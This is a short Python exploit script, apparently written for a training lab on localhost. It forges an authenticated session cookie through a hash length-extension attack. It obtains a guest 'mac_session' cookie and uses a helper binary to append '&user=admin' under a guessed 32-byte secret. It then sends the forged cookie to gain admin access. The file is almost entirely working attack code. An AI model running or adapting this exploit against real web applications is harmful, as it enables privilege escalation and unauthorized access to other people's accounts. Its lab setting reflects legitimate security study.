#!/usr/bin/env python

import subprocess
# Compatibility for Python 2 and 3
try:
    from urllib.request import HTTPCookieProcessor, build_opener, Request, urlopen
except ImportError:  # Python < 3
    from urllib2 import HTTPCookieProcessor, build_opener, Request, urlopen
try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode


URL = 'http://localhost:8666/mac/'
SECRETLEN = 32


def b(s):
    return s.encode('ascii')


# In <2.5, there's no str.partition
if not hasattr(str, 'partition'):
    def _partition(self, sep):
        pos = self.find(sep)
        if pos < 0:
            return (self, '', '')
        else:
            return (self[:pos], sep, self[pos + len(sep):])
else:
    _partition = str.partition

# In <2.7, there's no subprocess.check_output
if not hasattr(subprocess, 'check_output'):
    def _check_output(*args, **kwargs):
        kwargs = dict(kwargs)
        kwargs['stdout'] = subprocess.PIPE
        sp = subprocess.Popen(*args, **kwargs)
        stdout, _ = sp.communicate()
        if sp.returncode != 0:
            raise subprocess.CalledProcessError('Command returned non-zero exit status %r' % sp.returncode)
        return stdout

    class _CalledProcessError(Exception):
        pass
    subprocess.CalledProcessError = _CalledProcessError
    subprocess.check_output = _check_output


def _getCookie(cookiecp, key):
    jar = cookiecp.cookiejar
    for c in jar:
        if c.name == key:
            return c.value.strip('"')
    raise ValueError('Cookie not found')


def getGuestCookie():
    cookiecp = HTTPCookieProcessor()
    opener = build_opener(cookiecp)

    opener.open(URL)
    token = _getCookie(cookiecp, 'sessionID')

    data = {'csrfToken': token}
    data_enc = urlencode(data)
    headers = {'Cookie': 'sessionID=' + token}

    req = Request(URL + 'login', data_enc.encode('ascii'), headers)
    opener.open(req)
    return _getCookie(cookiecp, 'mac_session')


def main():
    h, _, val = _partition(getGuestCookie(), '!')
    inject = b('&user=admin')

    exploit = subprocess.check_output([
        './mac_extension', h, val, inject, str(SECRETLEN)])

    cookie_header = b('mac_session="') + exploit + b('"')
    req = Request(URL, headers={
        'Cookie': cookie_header,
    })
    r = urlopen(req)
    print(r.read())

if __name__ == '__main__':
    main()
